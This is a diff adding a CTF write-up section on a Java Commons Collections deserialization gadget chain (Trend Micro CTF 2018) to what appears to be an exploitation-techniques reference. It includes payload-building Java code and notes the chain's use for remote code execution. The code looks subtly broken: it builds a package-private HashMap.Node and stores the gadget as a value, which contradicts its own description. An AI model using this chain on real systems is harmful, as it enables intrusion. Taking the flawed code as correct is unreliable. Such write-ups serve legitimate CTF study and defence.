@@ -11,6 +11,7 @@ For core injection attacks (SQLi, SSTI, SSRF, XXE, command injection), see [serv
 - [.NET JSON TypeNameHandling Deserialization (DefCamp 2017)](#net-json-typenamehandling-deserialization-defcamp-2017)
 - [PHP Serialization Length Manipulation via Filter Word Expansion (0CTF 2016)](#php-serialization-length-manipulation-via-filter-word-expansion-0ctf-2016)
 - [PHP SoapClient CRLF SSRF via __call() Deserialization (N1CTF 2018)](#php-soapclient-crlf-ssrf-via-__call-deserialization-n1ctf-2018)
+- [Java TiedMapEntry + LazyMap + Reflection HashMap Patch (Trend Micro 2018)](#java-tiedmapentry--lazymap--reflection-hashmap-patch-trend-micro-2018)
 
 ---
 
@@ -321,5 +322,42 @@ session_start() with custom handler → SoapClient in session → __call() on ac
 ```
 
 **Key insight:** PHP's SoapClient `__call()` magic method fires HTTP requests when any undefined method is called. CRLF injection in the URI parameter smuggles complete HTTP requests, enabling authenticated SSRF to localhost. This is especially powerful when combined with other PHP deserialization vectors (session handlers, `phar://` wrappers) since `SoapClient` is a built-in PHP class requiring no additional libraries. Look for any code path where a deserialized object has a method called on it.
+
+---
+
+## Java TiedMapEntry + LazyMap + Reflection HashMap Patch (Trend Micro 2018)
+
+**Pattern:** Custom Java gadget chain that calls a static method (`Flag.getFlag()`) without any off-the-shelf ysoserial gadget. The chain uses `TiedMapEntry` wrapping a `LazyMap` whose factory is a `ChainedTransformer(ConstantTransformer(Flag.class), InvokerTransformer("getMethod", ...), InvokerTransformer("invoke", ...))`. Because LazyMap evaluates its factory on `get()` before serialization completes, the payload must smuggle the TiedMapEntry into a parent HashMap *after* building it — done by reflecting into `HashMap.table` and writing the entry directly.
+
+```java
+// Build the transformer chain (classic Commons Collections)
+Transformer[] chain = new Transformer[] {
+    new ConstantTransformer(Flag.class),
+    new InvokerTransformer("getMethod",
+        new Class[]{String.class, Class[].class},
+        new Object[]{"getFlag", new Class[0]}),
+    new InvokerTransformer("invoke",
+        new Class[]{Object.class, Object[].class},
+        new Object[]{null, new Object[0]}),
+};
+Map inner = LazyMap.decorate(new HashMap(), new ChainedTransformer(chain));
+TiedMapEntry entry = new TiedMapEntry(inner, "trigger");
+
+// Wrap in HashMap WITHOUT triggering LazyMap resolution:
+HashMap<Object, Object> outer = new HashMap<>();
+outer.put("placeholder", "x");            // force allocation of table[]
+Map.Entry[] table = (Map.Entry[]) Whitebox.getInternalState(outer, "table");
+table[0] = new HashMap.Node(0, "payload", entry, null);
+Whitebox.setInternalState(outer, "table", table);
+
+// Serialize and send
+ByteArrayOutputStream out = new ByteArrayOutputStream();
+new ObjectOutputStream(out).writeObject(outer);
+byte[] payload = out.toByteArray();
+```
+
+**Key insight:** The Commons Collections `LazyMap` + `ChainedTransformer` primitive can call any static method, not just `Runtime.exec`. When a CTF challenge adds its own `Flag.getFlag()` helper expecting the JVM to enforce access control, the same gadget chain used for RCE gives you direct method invocation. The tricky part is that calling `outer.put(payload, "x")` while building the HashMap would immediately resolve the LazyMap and leak the flag to the builder process — use reflection (`Whitebox.setInternalState` from PowerMock, or raw `Field.setAccessible(true)`) to write the TiedMapEntry into `HashMap.table` after the map is otherwise populated.
+
+**References:** Trend Micro CTF 2018 — Raimund Genes Cup Misc 300, writeup 11293
 
 ---
